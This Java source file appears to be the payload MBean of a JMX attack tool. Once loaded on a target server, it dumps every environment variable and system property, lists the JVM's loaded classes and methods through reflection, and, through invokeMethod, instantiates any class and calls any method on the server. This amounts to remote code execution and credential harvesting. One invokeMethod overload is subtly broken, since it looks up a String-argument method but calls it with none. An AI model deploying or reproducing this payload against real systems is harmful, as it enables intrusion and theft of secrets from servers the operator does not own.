
import java.lang.reflect.Method;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Vector;

public class Enum implements EnumMBean {

	public String info() {

		String toReturn = "\n";
		toReturn += "Call one of the enumeration methdod instead. e.g. -method enumBasic \n";

		//We can dynamically generate this output, but it' easier to understand if we manually do this
		toReturn += "enumBasic : returns basic information\n";
		toReturn += "enumJVM   : returns basic information JVM\n";
		toReturn += "enumAll   : returns basic and JVM info\n";
		toReturn += "listBasicProperties : returns java props\n";
		toReturn += "listJVMClasses : lists available JVM classes\n";
		toReturn += "listJVMMethods (class) : lists methods belong to a class\n";
		toReturn += "invokeMethod (class, method, param) : runs method on target\n";
		toReturn += "invokeMethod (class, method) : runs method on target\n";

		return toReturn;

	}

	/**
	 * This is currently restricted as we hardcode the parameters as type String when we invoke them in the PayloadHandler
	 * class. It can be used as a sample of how to invoke a remote method though until we expand this functionality.
	 * <p>
	 * If the method you're claling takes one String or no parameters, this will work fine. There are some situations
	 * where this might cause a weird error (e.g. if you call an 'exit' method)
	 *
	 * @param clazz     the name of the class instance you want to invoke
	 * @param method    the name of the method to call on the class instance
	 * @param parameter the parameter to pass into the method
	 * @return the output from the method if there isn't any
	 */
	public String invokeMethod(String clazz, String method, String parameter) {
		try {
			Class classToInvoke = Class.forName(clazz);
			Object classInstance = classToInvoke.newInstance();
			Method methodInstance = classToInvoke.getMethod(method, String.class);
			methodInstance.setAccessible(true);

			//equivalent to SomeClass.someMethod(someParameter). There will not always be a return value
			return methodInstance.invoke(classInstance, parameter).toString();
		} catch (Exception e) {
			return e.toString();
		}
	}

	public String invokeMethod(String clazz, String method) {
		try {
			Class classToInvoke = Class.forName(clazz);
			Object classInstance = classToInvoke.newInstance();
			Method methodInstance = classToInvoke.getMethod(method, String.class);
			methodInstance.setAccessible(true);

			//equivalent to SomeClass.someMethod(someParameter). There will not always be a return value
			return methodInstance.invoke(classInstance).toString();
		} catch (Exception e) {
			return e.toString();
		}
	}

	public String listJVMClasses() {
		return dumpJVMDetails(false);
	}

	public String listJVMMethods(String clazz) {
		StringBuilder toReturn = new StringBuilder("\n");

		try {
			Class classToList = Class.forName(clazz);
			Method[] methodList = classToList.getDeclaredMethods();

			for (Method method : methodList) {
				toReturn.append(method.toGenericString()).append("\n");
			}
		} catch (Exception e) {
			return e.toString();
		}
		return toReturn.toString();
	}

	public String listEnvironmentVariables() {
		StringBuilder toReturn = new StringBuilder("\n");
		Map<String, String> env = System.getenv();
		for (String envName : env.keySet()) {
			toReturn.append(envName).append("=").append(env.get(envName)).append("\n");
		}

		return toReturn.toString();
	}

	public String listJVMProperties() {
		StringBuilder toReturn = new StringBuilder("\n");
		Properties properties = System.getProperties();
		for (Map.Entry<Object, Object> entry : properties.entrySet())
			toReturn.append(entry.getKey()).append(" : ").append(entry.getValue());
		return toReturn.toString();
	}

	public String listBasicProperties() {
		StringBuilder toReturn = new StringBuilder("\n");
		for (Object property : System.getProperties().keySet()) {
			String key = property.toString();
			toReturn.append(key).append(": ").append(System.getProperty(key)).append("\n");
		}
		return toReturn.toString();
	}

	public String enumBasic() {
		String toReturn = "\n";
		toReturn += "Listing basic properties: ";
		toReturn += listBasicProperties();

		toReturn += "\nListing environment variables: ";
		toReturn += listEnvironmentVariables();
		return toReturn;
	}

	public String enumJVM() {
		String toReturn = "\n";
		toReturn += "Dumping JVM class loaders, classes, and available methods: ";
		toReturn += dumpJVMDetails(true); //Need to make a wrapper for this

		return toReturn;
	}

	public String enumAll() {
		String toReturn = "\n";
		toReturn += enumBasic();
		toReturn += enumJVM();
		return toReturn;
	}

	private String dumpJVMDetails(boolean verbose) {
		ClassLoader currentClassLoader = Thread.currentThread().getContextClassLoader();
		StringBuilder toReturn = new StringBuilder("\n");

		while (currentClassLoader != null) {
			toReturn.append("ClassLoader: ").append(currentClassLoader.toString()).append("\n");

			for (Iterator iter = list(currentClassLoader); iter.hasNext(); ) {
				String className = iter.next().toString().split(" ")[1];
				toReturn.append("\t [+] class: ").append(className).append("\n");
				if (verbose) {
					String methods = listJVMMethods(className);
					for (String method : methods.split("\\r?\\n")) {
						if (method != null && !method.trim().isEmpty())
							toReturn.append("\t\t [+] method : ").append(method).append("\n");
					}
				}
			}

			currentClassLoader = currentClassLoader.getParent();
		}
		return toReturn.toString();
	}

	//https://stackoverflow.com/questions/2548384/java-get-a-list-of-all-classes-loaded-in-the-jvm
	private static Iterator list(ClassLoader CL) {
		Class CL_class = CL.getClass();

		while (CL_class != java.lang.ClassLoader.class) {
			CL_class = CL_class.getSuperclass();
		}
		java.lang.reflect.Field ClassLoader_classes_field = null;

		try {
			ClassLoader_classes_field = CL_class.getDeclaredField("classes");
		} catch (NoSuchFieldException e) {
			//e.printStackTrace(); Suppressing to avoid printing in the server
		}

		ClassLoader_classes_field.setAccessible(true);
		Vector classes = null;

		try {
			classes = (Vector) ClassLoader_classes_field.get(CL);
		} catch (IllegalAccessException e) {
			//e.printStackTrace(); Suppressing to avoid printing in the server
		}

		return classes.iterator();
	}

}
